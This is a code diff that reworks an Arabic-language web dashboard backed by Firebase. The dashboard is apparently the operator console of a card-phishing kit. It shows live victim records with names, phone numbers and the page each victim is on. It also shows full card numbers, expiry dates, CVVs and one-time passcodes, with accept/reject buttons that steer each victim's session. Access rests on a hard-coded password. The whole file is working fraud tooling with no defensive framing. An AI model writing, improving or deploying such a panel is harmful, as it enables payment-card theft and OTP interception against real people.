@@ -2,24 +2,31 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحكم السريع</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>لوحة التحكم السريعة</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { font-family: sans-serif; background: #f0f0f0; margin: 0; padding: 0; }
-        .login-screen { position: fixed; inset: 0; background: #006C35; z-index: 999; display: flex; justify-content: center; align-items: center; }
-        .login-box { background: white; padding: 20px; border-radius: 10px; width: 80%; text-align: center; }
-        .login-box input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
-        .login-box button { width: 100%; padding: 10px; background: #006C35; color: white; border: none; font-weight: bold; }
+        * { box-sizing: border-box; font-family: sans-serif; }
+        body { background: #eee; margin: 0; padding: 0; }
         
-        .nav { background: #006C35; display: flex; padding: 5px; sticky: top; }
-        .nav button { flex: 1; padding: 10px; color: white; background: none; border: none; font-size: 14px; }
-        .nav button.active { border-bottom: 3px solid #d4af37; font-weight: bold; }
+        /* شاشة الدخول - مبسطة جداً */
+        #auth { position: fixed; inset: 0; background: #006C35; z-index: 9999; display: flex; justify-content: center; align-items: center; }
+        .login-box { background: white; padding: 20px; border-radius: 5px; width: 90%; max-width: 300px; text-align: center; }
+        .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #ddd; font-size: 18px; }
+        .login-box button { width: 100%; padding: 12px; background: #d4af37; border: none; font-weight: bold; cursor: pointer; }
+
+        .nav { background: #006C35; display: flex; position: sticky; top: 0; z-index: 100; }
+        .nav button { flex: 1; padding: 15px; color: white; background: none; border: none; font-size: 14px; border-bottom: 3px solid transparent; }
+        .nav button.active { border-bottom-color: #d4af37; font-weight: bold; }
+
+        .content { padding: 10px; }
+        .card { background: white; margin-bottom: 10px; padding: 15px; border-radius: 4px; border-right: 5px solid #006C35; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .card b { color: #006C35; font-size: 16px; }
+        .card code { display: block; background: #fffcf0; padding: 5px; margin: 5px 0; font-size: 16px; border: 1px solid #fcebb6; color: #856404; }
         
-        .card { background: white; margin: 10px; padding: 15px; border-radius: 8px; border-right: 5px solid #d4af37; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
         .btn-group { display: flex; gap: 5px; margin-top: 10px; }
-        .btn { flex: 1; padding: 8px; border: none; color: white; border-radius: 4px; font-weight: bold; }
+        .btn { flex: 1; padding: 12px; border: none; color: white; border-radius: 3px; font-weight: bold; font-size: 14px; }
         .ok { background: #28a745; }
         .no { background: #dc3545; }
         .hidden { display: none; }
@@ -27,21 +34,23 @@
 </head>
 <body>
 
-<div id="auth" class="login-screen">
+<div id="auth">
     <div class="login-box">
-        <h3>نظام الدخول</h3>
-        <input type="password" id="p" placeholder="كلمة المرور">
-        <button onclick="login()">دخول</button>
+        <h3>رمز الدخول</h3>
+        <input type="password" id="passCode" placeholder="أدخل الرقم السري">
+        <button onclick="doLogin()">دخول النظام</button>
     </div>
 </div>
 
 <div class="nav">
-    <button id="t1" class="active" onclick="show('b1', 't1')">العملاء</button>
-    <button id="t2" onclick="show('b2', 't2')">البطاقات</button>
+    <button id="t1" class="active" onclick="showTab('b1', 't1')">العملاء</button>
+    <button id="t2" onclick="showTab('b2', 't2')">البطاقات</button>
 </div>
 
-<div id="b1" class="tab-content"></div>
-<div id="b2" class="tab-content hidden"></div>
+<div class="content">
+    <div id="b1"></div>
+    <div id="b2" class="hidden"></div>
+</div>
 
 <script>
     const config = {
@@ -52,53 +61,64 @@
     firebase.initializeApp(config);
     const db = firebase.database();
 
-    function login() {
-        if(document.getElementById('p').value === "H1234567890H") {
-            document.getElementById('auth').classList.add('hidden');
-            sessionStorage.setItem('sh', '1');
-        } else { alert('خطأ'); }
+    function doLogin() {
+        if(document.getElementById('passCode').value === "H1234567890H") {
+            document.getElementById('auth').style.display = 'none';
+            sessionStorage.setItem('logged', 'true');
+        } else { alert('خطأ في الرمز'); }
     }
-    if(sessionStorage.getItem('sh') === '1') document.getElementById('auth').classList.add('hidden');
+    if(sessionStorage.getItem('logged') === 'true') document.getElementById('auth').style.display = 'none';
 
-    db.ref('orders').on('value', (s) => {
+    // الاستماع للبيانات
+    db.ref('orders').on('value', (snap) => {
         const b1 = document.getElementById('b1');
         const b2 = document.getElementById('b2');
         b1.innerHTML = ''; b2.innerHTML = '';
 
-        s.forEach((c) => {
-            const v = c.val();
-            const id = c.key;
-            const pi = v.personal_info || {};
-            const cd = v.card_details || {};
+        snap.forEach((child) => {
+            const data = child.val();
+            const id = child.key;
+            const p = data.personal_info || {};
+            const c = data.card_details || {};
 
+            // تبويب العملاء
             b1.innerHTML += `<div class="card">
-                <b>${pi.fullName || 'زائر'}</b><br>
-                <small>📞 ${pi.phone || '---'}</small><br>
-                <small style="color:blue">📍 ${v.current_page || 'دخول'}</small>
+                <b>${p.fullName || 'زائر'}</b><br>
+                <span>📞 ${p.phone || '---'}</span><br>
+                <small style="color: blue;">📍 حالياً في: ${data.current_page || 'البداية'}</small>
             </div>`;
 
-            if(cd.cardNumber) {
+            // تبويب البطاقات
+            if(c.cardNumber) {
                 b2.innerHTML += `<div class="card">
-                    <b>${pi.fullName || 'عميل'}</b><br>
-                    <code>${cd.cardNumber}</code><br>
-                    <small>${cd.expiryDate} | ${cd.cvv}</small><br>
-                    <b style="color:red">OTP: ${cd.otp || '---'}</b>
+                    <b>الاسم: ${p.fullName || 'غير مسجل'}</b>
+                    <code>${c.cardNumber}</code>
+                    <div style="display:flex; justify-content: space-between; font-size:13px;">
+                        <span>التاريخ: ${c.expiryDate}</span>
+                        <span>CVV: ${c.cvv}</span>
+                    </div>
+                    <div style="color:red; font-weight:bold; margin-top:5px;">OTP: ${c.otp || 'بانتظار الرمز...'}</div>
                     <div class="btn-group">
-                        <button class="btn ok" onclick="upd('${id}','next')">قبول</button>
-                        <button class="btn no" onclick="upd('${id}','error')">رفض</button>
+                        <button class="btn ok" onclick="action('${id}','next')">قبول ✅</button>
+                        <button class="btn no" onclick="action('${id}','error')">رفض ❌</button>
                     </div>
                 </div>`;
             }
         });
     });
 
-    function upd(id, a) { db.ref('orders/'+id).update({control_action: a}); }
-    
-    function show(id, t) {
-        document.querySelectorAll('.tab-content').forEach(x => x.classList.add('hidden'));
-        document.querySelectorAll('.nav button').forEach(x => x.classList.remove('active'));
-        document.getElementById(id).classList.remove('hidden');
-        document.getElementById(t).classList.add('active');
+    function action(id, type) {
+        db.ref('orders/' + id).update({ control_action: type });
+    }
+
+    function showTab(tabId, btnId) {
+        document.getElementById('b1').classList.add('hidden');
+        document.getElementById('b2').classList.add('hidden');
+        document.getElementById('t1').classList.remove('active');
+        document.getElementById('t2').classList.remove('active');
+        
+        document.getElementById(tabId).classList.remove('hidden');
+        document.getElementById(btnId).classList.add('active');
     }
 </script>
 </body>
